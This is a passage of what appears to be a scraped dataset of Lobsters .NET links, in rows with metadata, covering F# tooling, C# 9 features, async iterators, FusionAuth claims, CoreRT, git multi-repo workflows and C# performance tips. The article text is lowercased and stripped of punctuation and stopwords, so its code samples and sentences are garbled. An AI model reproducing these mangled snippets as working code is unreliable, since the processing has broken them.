tooling develop software macos might change linux soon write code f basically two choice vscode jetbrains rider vscode us plugin called ionide rider also f plugin know rider well c whilst fired ionide thing decided stick rider however thing rosy many feature rider get free c appear f plugins yet one example first spotted xml documentation starting noobie documentation key however looking giraffe xml doc work rider doc written markdown worked fine ionide instantly non standard approach speaking krzysztof cieślak said early made wrong decision advocating markdown fact ionide support traditional xml documentation good stuff thought let take look giraffe see swap markdown xml well bigger task hoped needed done people benefit editor one pr later done open rider view lovely new doc facepalm rider render xml doc properly f youtrack go file issue eugene auduchinok main man behind f support rider next intellisense f simply much support c much see intellisense crutch find massively useful learning productivity let see example c argument requires func action press ctrlspace rider offer create inline implementation create method simple example exist f matter ide use youtrack went kept going back probably become eugene favourite person hate love tooling get c would love see f make development experience better everyone another example analyzer chose npgsqlfsharp coding database helpfully analyzer validate sql write type use parameter many thing work vscode rider flip side rider many analyzer work vscode guess f issue ide issue interesting spot coming new language thing always seamless another thing also rely heavily decompiled third party code sourcelinked code debug actual source code decompiled version seems work rider vscode however using file member navigation rider downloaded source code work suffice say bombarding youtrack lot issue raised issue ionide would encourage others benefit tooling seem issue present enough make unbearable guess lot issue log could argued cosmetic like bit cosy fluffy ide support future far enjoyed coding f enjoyed reading people code f look forward path take fact happy announce july starting new job softwarepark initially working team writing f lucky join company friend already working worked past also get work alongside ian russell whose blog series mentioned helped tremendously getting started f softwarepark company based austria whose employee work remotely across europe share core belief writing software much look forward new journey working fine folk already employed however please pause take moment spare thought ian put hour day asking ridiculous question anyhow summary need monetise work net develop platform allow project thrive prevent microsoft adopting os much one make lot money c become large bucket syntax goodbye nancyfx hello f
40,Lobsters,dotnet,"C#, F#, .NET programming",C# 9: Simplified Parameter Null Validation,https://www.infoq.com/news/2020/06/CSharp-9-Null/,c simplified parameter null validation,simplified parameter null validation narrowly tailored feature proposal test plan orthoxerox suggested,last reported simplified parameter null validation feature challenged several competing proposal ranging attribute compiler flag full scale aop il weaving discarded favor narrowly tailored feature proposal reduces amount code needed validate nonnull parameter single character bang operator positioned identifier parameter list cause c compiler emit standard null checking code parameter example void string name translated void string name name null throw new argumentnullexception nameof name rule pretty straight forward null check injected beginning function code occur order parameter function signature null check specifically reference equality null ignoring operator overload used constructor check occur base class constructor called case iterators null checking always happen initial call lowered method compiler error occur null check appears parameter null eg struct unmanaged compiler error occur null check appears parameter without associated implementation eg abstract method delegate interface method partial method compiler error occur null check applied parameter compiler warning occur null check applied explicitly nullable parameter string x presumably allow subclass stricter base class compiler warning occur null check applied optional parameter null default value regarding constructor rule microsoft consider allowing parameter check occur invoking base class constructor always allowed net arguably preferable however c syntax expose capability want generate code created without using feature test plan see scenario generic void value ok void value struct error void value unmanaged error void value notnull ok void value class ok void value somestruct error void value someclass ok one flaw design offer support validating property value parameter implied orthoxerox suggested workaround bang operator applied set keyword scenario public foo foo get set public bar bar get return bar set bar value dosomethingelse
41,Lobsters,dotnet,"C#, F#, .NET programming",Exploring top-level statements in C# 9,https://www.tabsoverspaces.com/233831-exploring-top-level-statements-in-csharp-9,exploring toplevel statement c,exploring toplevel statement c elementary explore summary,exploring toplevel statement c jun min c roslyn wanted know toplevel statement feature c handled actually produced although originally planned quick test look il kept testing feature elementary started simplest code see using system consolewriteline test result fairly uncomplicated code compilergenerated internal static class program private static void main string args consolewriteline test explore return exit code using system consolewriteline test return compilergenerated internal static class program private static int main string args consolewriteline test return look like hmm use asyncawait using systemthreadingtasks await taskcompletedtask return compilergenerated internal static class program async state machine omitted asyncstatemachine typeof main private static task int main string args main statemachine default main statemachine tbuilder asynctaskmethodbuilder int create statemachine statemachine tbuilderstart ref statemachine return statemachine tbuildertask private static int main string args return main args getawaiter getresult ok ok expected still nice limited yet feature maybe local function using system test void test void consolewriteline test compilergenerated internal static class program private static void main string args main internal static void main consolewriteline test main internal static void main nothing special normal local function expanded class aah class going nested using system consolewriteline new test class test compilergenerated internal static class program private static void main string args consolewriteline new test internal class test ah make sense nested would create unnecessary complication naming variable using system var datetimeutcnowadd timespanfromseconds consolewriteline test void test consolewriteline compilergenerated internal static class program structlayout layoutkindauto private struct public datetime private static void main string args default datetimeutcnowadd timespanfromseconds consolewriteline main ref internal static void main ref consolewriteline finally something interesting compiler creating instance field expecting trying force creating struct value type instead passing around using ref unsafe code let start safe ish span using system span long longs stackalloc long consolewriteline longsisempty compilergenerated internal static class program private static void main string args consolewriteline stackalloc long isempty let switch really unsafe code using system long longs stackalloc long fails error pointer fixed size buffer may used unsafe context aka ok look like compiler generate unsafe main ok create unsafe method using system test unsafe void test fixed char value safe char ptr value ptr consolewriteline ptr ptr compilergenerated internal static class program private static void main string args main internal unsafe static void main fixed char ptr safe getpinnablereference char ptr consolewriteline nice think enough playing summary like compiler us struct ref passing handle global instance variable smart although look like small feature almost like take code smack generated main easy lot feature c one use luckily feature one seamlessly use using toplevel statement
42,Lobsters,dotnet,"C#, F#, .NET programming","The anatomy of async iterators (aka await, foreach, yield)",https://blog.marcgravell.com/2020/05/the-anatomy-of-async-iterators-aka.html,anatomy async iterators aka await foreach yield,http sharplabio iterators sync world absolutely end need async iterators via nuget might complete synchronously cancellation summary,going discus mechanism concept relating async iterators c hope demystifying bit also showing use advanced slightly hidden feature going give illustration happens hood note illustration literal generated expansion deliberately help show conceptually happening ignore sublte implementation detail accidental always want see actual code tool like http sharplabio awesome change result view c paste code interested onto left iterators sync world discus async iterators let start recapping iterators many folk may already familiar hey help set scene importantly useful allow u compare contrast later look async change thing know write foreach loop sequence form foreach var item somesource consolewriteline item item somesource return get line console somesource could returning fully buffered set data like list string ienumerable string somesource int x var list new list string int listadd result somesource x x result return list problem requires somesource run completion get even first result could take lot time memory generally restrictive often trying represent sequence may unbounded least openended example could pulling data remote work queue want holding one pending item time b may logical end turn c definition sequence purpose foreach fine instead returning list write iterator block ienumerable string somesource int x int yield return result somesource x x result work similarly fundamental difference noticeably nt ever buffer make one element available time understand work useful take another look foreach compiler interprets foreach something like following using var iter somesource getenumerator itermovenext var item itercurrent consolewriteline item little loose phrasing foreach nt actually tied ienumerable ducktyped api shape instead using may may example fundamentally compiler call getenumerator expression passed foreach creates loop checking movenext defines data advance mechanism success case access current property expose element advanced aside historically prior c compiler used scope item outside loop might sound innocent source absolutely end confusion code erros question stack overflow think captured variable hopefully see consumer access unbounded forwardsonly sequence via movenext current approach get implemented iterator block anything involving yield keyword actually incredibly complex going take lot liberty going similar ienumerable string somesource int x new generatedenumerable x class generatedenumerable ienumerable string private int x public generatedenumerable int x thisx x public ienumerator string getenumerator new generatedenumerator x nongeneric fallback ienumerator ienumerablegetenumerator getenumerator class generatedenumerator ienumerator string private int x public generatedenumerator int x thisx x public string current get private set nongeneric fallback object ienumeratorcurrent current finally code would go public void dispose advance logic public bool movenext current result somesource x x result return true else return false api essentially deprecated never used void ienumeratorreset throw new notsupportedexception let tear apart firstly need object represent ienumerable also need understand ienumerable ienumerator returned getenumerator different apis generated version lot overlap share instance help discus kept two concept separate call somesource create generatedenumerable store state x passed somesource expose required ienumerable api later could much later caller iterates foreach data getenumerator invoked call generatedenumerator act cursor data movenext logic implement loop conceptually one step per call movenext data current assigned thing would passed yield return note also yield break c keyword terminates iteration would essentially return false generated expansion note nuanced difference handwritten version c compiler need deal example happens change x enumerator code movenext later iterate data second time value x emphasis nt care nuance discussion hopefully give enough flavor understand foreach iterators yield let get onto interesting bit async need async iterators work great synchronous world lot net work favoring asyncawait particular improve server scalability big problem code bool movenext explicitly synchronous thing take time blocking thread blocking thread increasingly anathema u context earlier remote work queue example might anything second minute hour really nt want block thread kind time closest without async iterators fetch data asynchronously buffered example async task list string somesource int x semantics getting back buffering assuming nt want fetch everything one go get around eventually end implementing kind async batch loop monstrosity effectily reimplements foreach using manual ugly code negating reason foreach even exists address c bcl recently added support async iterators yay new apis available via nuget public interface iasyncenumerable iasyncenumerator getasyncenumerator cancellationtoken cancellationtoken default public interface iasyncenumerator iasyncdisposable current get valuetask bool movenextasync public interface iasyncdisposable valuetask disposeasync let look example time added async look consumer first code foreach let imagine iasyncenumerable string somesourceasync int x throw new notimplementedexception focus loop c await foreach concept await foreach var item somesourceasync consolewriteline item compiler interprets something similar await using var iter somesourceasync getasyncenumerator await itermovenextasync var item itercurrent consolewriteline item note await using similar using disposeasync called awaited instead dispose even cleanup code asynchronous key point actually pretty similar sync version added await ultimately however moment add await entire body ripped apart compiler rewritten asynchronous state machine nt topic article even going try cover await implemented behind scene today miracle happens suffice observant might also wondering wait cancellation nt worry get enumerator along await foreach also write async iterators yield example could async iasyncenumerable string somesourceasync int x int await taskdelay simulate async something yield return result somesource x x result real code could consuming data remote source asynchronously effective mechanism expressing open sequence asynchronous data particular remember await itermovenextasync might complete synchronously data available immediately context switch imagine example iterator block request data remote server page yield return record data current page making available immediately await need fetch next page behind scene compiler generates type implement iasyncenumerable iasyncenumerator piece time even obtuse owing asyncawait restructuring intend try cover hope instead wave hand say know expansion wrote hand earlier like async however important topic overlooked cover cancellation cancellation async apis support cancellation via cancellationtoken exception look back iasyncenumerable see passed getasyncenumerator method writing loop hand achieved via withcancellation similarly configureawait used configure await indeed even configureawait use example could showing config option action await foreach var item somesourceasync withcancellation cancellationtoken configureawait false consolewriteline item would semantically equivalent var iter somesourceasync getasyncenumerator cancellationtoken await using iterconfigureawait false await itermovenextasync configureawait false var item itercurrent consolewriteline item split iter local illustrate configureawait applies disposeasync via await iterdisposeasync configureawait false finally pas cancellationtoken iterator use thing get even fun naive way would think along line ca nt take cancellationtoken getasyncenumerator called perhaps create type hold state get point create iterator block getasyncenumerator method something like unnecessary copy iasyncenumerable string somesourceasync int x new somesourceenumerable x class somesourceenumerable iasyncenumerable string private int x public somesourceenumerable int x thisx x public async iasyncenumerator string getasyncenumerator cancellationtoken cancellationtoken default int await taskdelay cancellationtoken simulate async something yield return result somesource x x result work cancellationtoken passed via withcancellation iterator cancelled correct time including taskdelay could also check iscancellationrequested call throwifcancellationrequested point iterator block right thing would happen making life hard compiler u via enumeratorcancellation could also async iasyncenumerable string somesourceasync int x enumeratorcancellation cancellationtoken cancellationtoken default int await taskdelay cancellationtoken simulate async something yield return result somesource x x result work similarly approach cancellationtoken parameter make token getasyncenumerator via withcancellation available iterator block nt create dummy type one slight nuance though changed signature somesourceasync adding parameter code still compiles parameter optional prompt question happens passed one example difference option cancellation await foreach var item somesourceasync option b cancellation via withcancellation await foreach var item somesourceasync withcancellation cancellationtoken option c cancellation via somesourceasync await foreach var item somesourceasync cancellationtoken option cancellation via await foreach var item somesourceasync cancellationtoken withcancellation cancellationtoken option e cancellation via different token await foreach var item somesourceasync tokena withcancellation tokenb answer right thing happens nt matter api use cancellation token provided respected pas two different token either token cancelled considered cancelled happens original token passed via parameter stored field generated enumerable type getasyncenumerator called parameter getasyncenumerator field inspected genuine different cancellable token cancellationtokensourcecreatelinkedtokensource used create combined token think createlinkedtokensource cancellation version taskwhenany otherwise either genuine cancellable used result write async cancellable iterator nt need worry much whether caller used api directly v indirectly might concerned fact changed signature however case neat trick use two method one without token consumer one token actual implementation public iasyncenumerable string somesourceasync int x somesourceimplasync x private async iasyncenumerable string somesourceimplasync int x enumeratorcancellation cancellationtoken cancellationtoken default int await taskdelay cancellationtoken simulate async something yield return result somesource x x result would seem ideal candidate local function unfortunately current time parameter local function allowed decorated attribute hope language compiler folk take pity u allow u future something like public iasyncenumerable string somesourceasync int x return impl compile today async iasyncenumerable string impl enumeratorcancellation cancellationtoken cancellationtoken default int await taskdelay cancellationtoken simulate async something yield return result somesource x x result equivalent using static local function usually preference avoid surprise capture work good news work preview language version guarantee land summary implement use async iterators c looked consumer producer version iterators synchronous asynchronous code path looked various way accessing cancellation asynchronous iterators lot going hopefully useful meaningful
43,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET Core Example with Custom Claims,https://fusionauth.io/blog/2020/05/27/sharing-custom-oauth-claims-with-a-asp-netcore-app,aspnet core example custom claim,build web application previous post setting role group warning full source code adding custom claim lambda created user viewing custom claim conclusion,previously used aspnet core build web application single protected page let extend application display role user fusionauth well custom claim going create group assign role group place user group also explore modifying json web token jwt using lambda expose user favorite color finally display claim secure page yet please set fusionauth web application specified previous post setting role group let navigate fusionauth administration console add role application note instead blue button edit application configuration click dark blue button person symbol add application role many free limited adding admin user role want create group call aspnet core user group associate user role finally need add user group navigate examplecom user user created registered dotnetcore application go group tab add user aspnet core user group warning user registered application member group role application nothing let login reminder start aspnet core application full source code available dotnet publish r head http click secure page see claim previously signed may need sign sign role present jwt see since role claim encoded jwt stored cookie whenever change user data fusionauth need log log user see change reflected aspnet core application adding custom claim add claim based user data time day anything else fusionauth add data jwt lambda javascript function receives jwt object signed modify remember way back created user specified favorite color command line option well going send information aspnet core web application display valuable data lambda flexible pull user registration data modify token removing attribute also though immutable lambda function populate jwt user registration jwtfavoritecolor userdatafavoritecolor create going use fusionauth api rather administration console felt long since curled something create api key called lambda management allowing full access lambda api allow user key patch application object well need latter configure fusionauth application use lambda shell script creates lambda associate dotnetcore application must update authheader environment variable value api key created also sure update applicationid id dotnetcore application script call one api create lambda another configure application use also need extract id lambda create used sed regular expression extract id response first api call authheaderyourapikeyhere applicationidyourappidhere lambdaoutput curl xpost h authorization authheader h contenttype applicationjson http lambda body function populate jwt user registration jwtfavoritecolor userdatafavoritecolor name addfavoritecolor type jwtpopulate lambdaid echo lambdaoutputsed r id applicationpatch application lambdaconfiguration accesstokenpopulateid lambdaid idtokenpopulateid lambdaid output curl xpatch h authorization authheader h contenttype applicationjson http applicationid applicationpatch running shell script log admin user interface see lambda exists assigned run jwts created application course implied rather running script could create lambda using administration user interface associate application think lambda setup via shell script show power fusionauth api everything admin interface automate using api viewing custom claim head http see something like course much use realworld application display claim might customize user display based favorite color user role could gate functionality information conclusion post end journey integrating fusionauth aspnet core offloading user management concern identity management solution fusionauth free focus feature business logic application whether displaying user favorite color hopefully something useful
44,Lobsters,dotnet,"C#, F#, .NET programming",.NET async/await in a single picture,https://tooslowexception.com/net-asyncawait-in-a-single-picture/,net asyncawait single picture,calling thread may released work better scalability overlapped io io completion port io completion thread inplace iocp thread schedule back place epoll state machine instance thread http asyncexpertcom,said picture worth thousand word agree like preparing technical drawing explain various concept short story asyncawait work net main power behind asyncawait await ongoing io operation calling thread may released work provides great thread reusability thus better scalability much smaller number thread able handle amount operation comparing asynchronouswaiting approach main role play socalled overlapped io case window allows asynchronously delegate io operation operating system completion provided callback notify u result main workforce socalled io completion port iocp io completion port efficient mechanism asynchronous io window allowing observe huge amount ongoing operation one port indeed case net baked single iocp io completion thread managed threadpool observing single iocp typical number iocp thread equal number logical processor threadpool may create default change maximum callback io operation executed one iocp thread set result operation decides whether execute continuation inplace iocp thread beneficial incur context switch avoids cache trashing obviously risk polluting important iocp thread user code may lead thread starvation schedule back place may pointed synchronizationcontexttaskscheduler quite typically queued execution worker thread typically continuation scheduled worker thread one significant exception httpclient continuation window since net core note case linux epoll mechanism used instead iocps isare epoll thread listening event schedule continuation worker thread inlining may happen ongoing work rebuild threadpool linux using aio iouring made dot connected state machine instance keeping track status continuation execute whole context an drawing reminded famous thread article stephen cleary explains user code executing thread consumed asynchronous io operation performed indeed true although people also noticed comment iocp thread blocked processing io completion port notification almost thread similar picture generic relationship threadpool io completion port drawn pretty big attention yesterday may also interested work much bigger project http asyncexpertcom online course asynchronous concurrent programming net found interesting stay tuned subscribing newsletter abovementioned page
46,Lobsters,dotnet,"C#, F#, .NET programming",CoreRT - A .NET Runtime for AOT,http://www.mattwarren.org/2018/06/07/CoreRT-.NET-Runtime-for-AOT/,corert net runtime aot,corert net runtime aot corert github repo rest post look actually mean content existing net aot implementation highlevel overview compiler runtime hello world program limitation reading existing net aot implementation corert mono net native project n official announcement net core scenario net standard crossplatform net native net native share many corert part highlevel overview line code native systemprivatecorelib systemprivateinterop systemprivatetypeloader systemprivatereflectioncore intermediate language il compiler common code compiler intro net native corert net native cil byte code llilc il cpp click larger version ilcompilersrcprogramcs reachable modulestypesclasses compilation root ilscannercs reflection optional rdxml file necessary metadata ilcompilermetadatawriter compile il compilationcs write compiled method objectwriter llvm underthehood include code actually used runtime corert runtime intro net native corert refactored layered runtime gc used coreclr always wanted implement runtime functionality c detail long time runtime component comment core corert runtime provides basic service code run think garbage collection exception handling stack walking srcnativeruntime srcnativegc srcruntimebase pal component c code shared coreclr coreclr runtime multiple repository dotnetcorert dotnetcoreclr dotnetcorefx shared src total native code gc gccpp jit interface objwriter core runtime cpu specific helper hello world program done reduce note absolute bareminimum app testcorelib available mb mb dumpbin tool zip file full ouput limitation missing functionality complex apps using corert nuget package instruct use f support gcgetmemoryinfo cangetcookieforpinvokecallisig building native executables net corert mark rendle reflection reflection runtime codegeneration shown explained issue detail corert restriction makegenerictype makegenericmethod using process computemetadata method adding blob located using rhfindblob api runtime codegeneration slow dynamic runtime codegeneration problematic aot scenario aspnetdependencyinjection hackernews rdotnet reading,corert net runtime aot jun word firstly exactly corert github repo net core runtime optimized aot ahead time compilation scenario accompanying net native compiler toolchain rest post look actually mean content existing net aot implementation highlevel overview compiler runtime hello world program limitation reading existing net aot implementation however look corert worth pointing existing net aheadoftime aot implementation around mono net native window apps aka project n existing implementation corert created official announcement give u idea want shortcut twostep compilation process deliver native application window mac linux need alternative clr project aiming deliver solution aheadoftime compilation process called corert main difference corert designed support net core scenario ie net standard crossplatform etc also worth pointing whilst net native separate product related fact net native share many corert part highlevel overview code open source easily identify main component understand complexity firstly let look line code clearly see majority code written c native component written c largest single component systemprivatecorelib c code although subcomponents contribute systemprivatexxx systemprivateinterop loc systemprivatetypeloader systemprivatereflectioncore significant component intermediate language il compiler common code used reused everything else component discussed detail compiler whilst corert runtime also need compiler put everything together intro net native corert net native native toolchain compiles cil byte code machine code eg instruction default net native net core opposed uwp us ryujit aheadoftime aot compiler one coreclr us justintime jit compiler also used compiler llilc utc uwp apps il cpp il textual c compiler built reference prototype actually look like practice say picture paint thousand word click larger version give detail main compilation phase started ilcompilersrcprogramcs following calculate reachable modulestypesclasses ie compilation root using ilscannercs allow reflection via optional rdxml file generate necessary metadata using ilcompilermetadatawriter compile il using specific backend genericshared code compilationcs finally write compiled method using objectwriter turn us llvm underthehood code end final exe along way corert compiler also generates several helper method cover following scenario fortunately compiler blindly include code find intelligent enough include code actually used use illinker everything get naturally treeshaken compiler start compiling mainnativecallable export continue compiling method generating necessary data structure go type method used compiler even look runtime userhelper code sits ontop corert runtime intro net native corert corert net core runtime optimized aot scenario net native target refactored layered runtime base small native execution engine provides service garbage collection gc gc used coreclr many part traditional net runtime type system implemented c always wanted implement runtime functionality c infrastructure addition library implementation built deep coreclr also cleanly refactored implemented c library last point interesting advantageous implement runtime functionality c well turn hard unmanaged language subtle hardtotrackdown way get wrong known gc hole botr provides detail author tweet significant jan kota worked net runtime long time think something hard really runtime component previously mentioned layered runtime ie made several distinct component explained comment core corert runtime provides basic service code run think garbage collection exception handling stack walking runtime pretty small mostly depends cc runtime even c runtime dependency hard requirement jan pointed code mostly life srcnativeruntime srcnativegc srcruntimebase structured place require interacting underlying platform allocating native memory threading etc go platform abstraction layer pal pal window linux macos others added see pal component following location c code shared coreclr one interesting aspect corert runtime wherever possible share code coreclr runtime part larger effort ensure wherever possible code shared across multiple repository directory contains shared source systemprivatecorelib shared dotnetcorert dotnetcoreclr dotnetcorefx source synchronized mirroring tool watch new commits either side creates new pull request dotnetbot repository recently significant amount work done moved code shared partition ensure work duplicated fix shared across location see work looking link mean c code systemprivatecorelib shared coreclr unique corert group c loc file shared src total native code finally whilst advantageous write much code possible c certain component written c include gc majority one file gccpp almost loc jit interface objwriter based llvm significantly core runtime contains code activity like threading stack frame handling debuggingprofiling interfacing o cpu specific helper exception handling gc write barrier stubsthunks optimised object allocation hello world program one first thing people asked corert size hello world app answer mb compile release mode work done reduce highlevel exe produced look like note different colour correspond original format component obviously output single native executable file file come full net specific base runtime class library systemprivatexxx get lot functionality absolute bareminimum app fortunately way see bareminimum runtime would look like compiling testcorelib project included corert source using end exe look like minimal ootb even write hello world console systemconsole type bit hacking able build version working console output interested diff available make work include following component testcorelib really minimal runtime difference size dramatic shrink mb compared mb fullyfeatured runtime type standard byte testcorelib byte difference data managed pdata rdata reloc text rdata total byte total mb data size obtained using microsoft dumpbin tool disasm cmd line switch zip file full ouput produce following summary note size value hex summary data managed pdata rdata reloc text rdata also contained output assembly code simple hello world method helloworldhelloworldprogrammain lea rcx da lea rax ff jmp rax nop nop nop dig see code systemconsolewriteline push rsi ec sub mov rsi rcx ad ff ff call systemconsolesystemconsolegetout mov rcx rax mov rdx rsi mov rax qword ptr rax mov rax qword ptr add pop rsi ff jmp rax nop nop limitation missing functionality people successfully run complex apps using corert stand corert still alpha product least according nuget package official sample instruct use seen information full release available functionality yet implemented eg f support gcgetmemoryinfo cangetcookieforpinvokecallisig callus pinvoke information recommend entertaining presentation building native executables net corert mark rendle half chronicle issue ran trying run aspnet app corert may well fixed reflection fundamentally nature aot compilation main stumbling block may also run reflection runtime codegeneration firstly want use reflection code need tell corert compiler type expect reflect bydefault includes type know using file called rdxml shown unfortunately always require manual intervention reason explained issue information available comment detail corert restriction makegenerictype makegenericmethod make reflection work compiler add required metadata final exe using process would reuse scheme already ryujit codegen path compiler generates blob byte describes metadata namespaces type member custom attribute method parameter etc data generated byte array computemetadata method metadata get embedded data blob executable image achieved adding blob ready run header ready run header well known data structure located code framework runtime ready run header along blob refers emitted final executable runtime pointer byte array located using rhfindblob api parser constructed array used reflection stack runtime codegeneration net often use reflection slow followed dynamic runtime codegeneration reflectionemit technique widely using net library serialisationdeserialisation dependency injection object mapping orm issue runtime code generation problematic aot scenario aspnet dependency injection introduced dependency reflectionemit aspnetdependencyinjection unfortunately make incompatible corert make functional corert aot environment introducing il interpretter would still perform poorly dependency injection framework using reflectionemit performance critical path would really aspnet provide aotfriendly flavor generates code build time instead runtime make work well would likely help startup without corert well sure solved one way see moment still workinprogress discus post hackernews rdotnet reading got far link might interested
47,Lobsters,dotnet,"C#, F#, .NET programming",Repository Madness,https://alexbilson.dev/posts/multi-repository-madness/,repository madness,background subversion mismatched repository forest irrelevant change branch sync mistake resolution psgitsync script,month ago three colleague added new feature legacy net application one technical challenge faced distributed nature application codebase background code history originally stored subversion svn organization shifted active repository svn git early one carryovers original multirepository structure build app add feature local machine needed clone eight repository except one master repo repository dependency least one sometimes one contained mostly business implementation others mostly object definition yet others primarily web service example working service controller wanted add new object interface create interface separate repo write implementation current repo certain object implemented second repo defined third long job realized change system might unforseen result three overcame technolory exception mismatched repos forest irrelevant uncommited change mistake syncing dozen feature branch mismatched repository every time repository updated team member might spend halfday tracking mysterious error exception would point method one repository developer tracked error source discover error originated repo threw error another repo entirely eventually caught error see git pull likely caused mismatch change repos two common culprit first developer pull update every repository one repository would become outofsync might cause build error sometimes would cause runtime error second developer failed commit push every change relevant feature work amount repo synchronization would resolve error often developer know missed change next painful experience forest irrelevant change developer change nearly impossible identify forest file creation update caused build process change relevant product release current feature every time code built repository would increment app version multiple assembly version file repos contained frontend code flood html would generated precursor razor view engine copied master view repository given repo would multiple terminal buffer full change call git status might rightly ass gitignore file would alleviate problem created remember change across eight repository time developer needed verify file changed need run git status eight separate directory since developer check change every commit feature require many commits ton room error branch sync mistake team operated single working branch per repository dev would also one feature branch every repo sometimes several completed feature waiting code review example needed make change three file implement story file different repo would need feature branch four devs two feature branch open across eight repository many potential branch iteration could checked locally sixteen million assuming everyone branch pushed remote repository uptodate every local machine always case resolution developer worked code every day personal process made work proficient despite challenge team productive first commits took action first add gitignore file exclude massive number generated file local build process receive authorization right away wrote quick dirty powershell script explicitly restore delete irrelevant file script became irrelevant configured gitignore file added branch forest change tamed built powershell script automate many git task reduced likelihood branch mistake mismatched repos script could switch branch across every repository pull latest change everywhere print comprehensive file status script ensure never see issue speed cut mistake interested implemented powershell script need copy check source code psgitsync script
48,Lobsters,dotnet,"C#, F#, .NET programming",Single static binaries are coming to .NET Core,https://github.com/dotnet/runtime/issues/36590,single static binary coming net core,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
49,Lobsters,dotnet,"C#, F#, .NET programming",Performance best practices in C#,https://medium.com/@kevingosse/performance-best-practices-in-c-b85a47bdd93a,performance best practice c,performance best practice c waiting synchronously asynchronous code ever wait synchronously noncompleted task article configureawait code may called synchronization context use configureawait false await call ever meaning using await keyword async void never use async void avoid async possible culturesensitive comparison always use ordinal comparison concurrentbag never use concurrentbag without benchmarking prefer concurrentqueue readerwriterlock readerwriterlockslim never use readerwriterlock readerwriterlockslim without benchmarking prefer lambda function instead methodgroup converting enums string enum comparison note true anymore net core since version optimization performed automatically jit implement equality member structs http devblogsmicrosoftcompremierdeveloperperformanceimplicationsofdefaultstructequalityinc avoid unnecessary boxing using structs interface cancellationtoken subscription always inlined taskcompletionsource continuation often inlined unless good reason omit always use taskcreationsoptionsruncontinuationsasynchronously parameter creating taskcompletionsource taskcontinuationoptions taskcreationoptions taskrun taskfactorystartnew,performance best practice c recently compile list best practice c criteo figured would nice share publicly goal article provide nonexhaustive list code pattern avoid either risky perform poorly list may seem bit random context item spotted code point caused production issue hopefully serve warning prevent making mistakesalso note criteo web service rely highperformance code hence need avoid inefficient code pattern pattern make noticeable difference applicationslast least point already discussed length many article configureawait elaborate goal list point keep mind rather indepth technical description themwaiting synchronously asynchronous codedon ever wait synchronously noncompleted task including limited taskwait taskresult taskgetawaiter getresult taskwaitany taskwaitallas general advice synchronous dependency two threadpool thread susceptible cause threadpool starvation cause phenomenon described articleconfigureawaitif code may called synchronization context use configureawait false await callsnote however configureawait ever meaning using await keywordfor instance code make sense async voidnever use async void exception thrown async void method propagated synchronization context usually end crashing whole applicationif return task method instance implementing interface move async code another method call avoid async possibleout habitmuscle memory might write code semantically correct using async keyword needed significant overhead hot path try removing whenever possible however keep mind use optimization code wrapped block like trycatch using incorrect version since task awaited inside using block client might disposed getasync call completesculturesensitive comparisonsunless reason use culturesensitive comparison always use ordinal comparison instead make much difference enus culture internal optimization comparison get one order magnitude slower culture order magnitude linux string comparison frequent operation application quickly add upconcurrentbag never use concurrentbag without benchmarking collection designed specific usecases time item dequeued thread enqueued suffers important performance issue used otherwise need concurrent collection prefer concurrentqueue readerwriterlock readerwriterlockslim never use readerwriterlock readerwriterlockslim without benchmarking may tempting use kind specialized synchronization primitive dealing reader writer cost much higher simple monitor usable lock keyword unless number reader executing critical section time high concurrency enough amortize increased overhead code perform worseprefer lambda function instead methodgroupconsider following code resharper suggests rewrite code without lambda function may look cleaner unfortunately introduces heap allocation call indeed call compiled significant impact code called hot spotusing lambda function trigger compiler optimization cache delegate static field removing allocation work filter static may want cache delegate converting enums stringcalling enumtostring net costly reflection used internally conversion calling virtual method struct cause boxing much possible avoidedoftentimes enums actually replaced const string really need enum consider caching converted value dictionary amortize costenum comparisonsnote true anymore net core since version optimization performed automatically jitwhen using enums flag may tempting use enumhasflag method code cause two boxing allocation one convert enum another one hasflag virtual call struct make code disproportionately expensive instead sacrifice readability use binary operator implement equality member structswhen using struct comparison instance used key dictionary need override equalsgethashcode method default implementation us reflection slow implementation generated resharper usually good enoughmore information http devblogsmicrosoftcompremierdeveloperperformanceimplicationsofdefaultstructequalityincavoid unnecessary boxing using structs interfacesconsider following code tempting make intvalue struct avoid heap allocation since addvalue sendvalue expect interface interface reference semantics value boxed every call nullifying benefit optimization fact allocate even intvalue class since value boxed independently callif write api expect value structs try using generic method making method generic look useless first glance actually allows avoid boxing allocation intvalue structcancellationtoken subscription always inlinedwhenever cancel cancellationtokensource subscription executed inside current thread lead unplanned pause even subtle deadlocksyou optout behavior therefore cancelling cancellationtokensource ask whether safely let current thread hijacked answer wrap call cancel inside taskrun execute threadpooltaskcompletionsource continuation often inlinedjust like cancellationtoken subscription taskcompletionsource continuation often inlined nice optimization cause subtle error instance consider following program call tcssetresult cause continuation await processasync execute current thread therefore statement mutexwait executed thread supposed call mutexset resulting deadlock prevented giving taskcreationsoptionsruncontinuationsasynchronously parameter taskcompletionsourceunless good reason omit always use taskcreationsoptionsruncontinuationsasynchronously parameter creating taskcompletionsourcebeware code also compile use taskcontinuationoptionsruncontinuationsasynchronously instead taskcreationoptionsruncontinuationsasynchronously parameter ignored continuation keep inlined surprisingly common error taskcontinuationoptions come taskcreationoptions autocompletiontaskrun taskfactorystartnewunless reason use taskfactorystartnew always favor taskrun start background task taskrun us safer default importantly automatically unwraps return task prevent subtle error async method consider following program despite appearance end program displayed processing done taskfactorystartnew going return task task code wait outer task correct code would either await taskfactorystartnew processasync unwrap await taskrun processasync three legitimate usecases taskfactorystartnew starting task different schedulerexecuting task dedicated thread using taskcreationoptionslongrunning queuing task threadpool global queue using taskcreationoptionspreferfairness
50,Lobsters,dotnet,"C#, F#, .NET programming",Pinned Object Heap in .NET 5,https://tooslowexception.com/pinned-object-heap-in-net-5/,pinned object heap net,interesting change added gc dedicated introduces fragmentation would perfect get rid pinned object move different place allocator know nothing fact object created pinned future new allocation api provided array runtime documentation allocation little slower regular soh allocation limit array type reference contain reference ongoing discussion summary pr added kestrel,upcoming net interesting change added gc dedicated pinned object heap new type managed heap segment small large object heap far pinning cost introduces fragmentation general complicates object compaction lot used good practice like pin short time gc bother reduce probability gc happens many object pinned scenario use fixed keyword fact lightweight way flagging particular local variable pinned reference long gc happen additional overhead long time gc promote object generation gc common impact minimized also scenario use gchandle type pinned little bigger overhead need allocatefree handle however even applied rule produce fragmentation depending much pin long resulting layout pinned object memory many intermittent condition end would perfect get rid pinned object move different place sohloh separate place would simply ignored gc design considering heap compaction get pinning behaviour box however concept simple straightforward implement current api allocation c currently pinning twophase process allocate object store resulting reference somewhere pin object help fixed keyword gchandle word allocator know nothing fact object created pinned future altogether pinned object heap introduced net new allocation 